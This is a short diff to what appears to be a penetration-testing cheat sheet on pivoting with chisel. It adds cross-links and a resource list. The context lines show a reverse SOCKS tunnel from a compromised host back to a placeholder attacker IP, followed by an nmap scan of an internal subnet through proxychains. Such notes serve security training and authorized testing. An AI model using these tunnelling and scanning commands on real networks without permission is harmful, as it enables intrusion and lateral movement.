@@ -426,3 +426,12 @@ chisel client {ATTACKER_IP}:8000 R:socks
 # Use with proxychains
 proxychains nmap -sT -Pn 192.168.1.0/24
 ```
+
+TUN pivot (whole subnet, no SOCKS): [ligolo-ng](./ligolo-ng.md). SOCKS wrapper: [proxychains](./proxychains.md). SSH `-L`/`-R`/`-D`: [SSH tunneling](./port-forwarding.md).
+
+## Resources
+
+- [chisel](https://github.com/jpillora/chisel) — official GitHub
+- [ligolo-ng](./ligolo-ng.md) — TUN pivot instead of per-port forwards
+- [proxychains](./proxychains.md) — send nmap/curl through `R:socks`
+- [SSH tunneling](./port-forwarding.md) — OpenSSH when it is already there
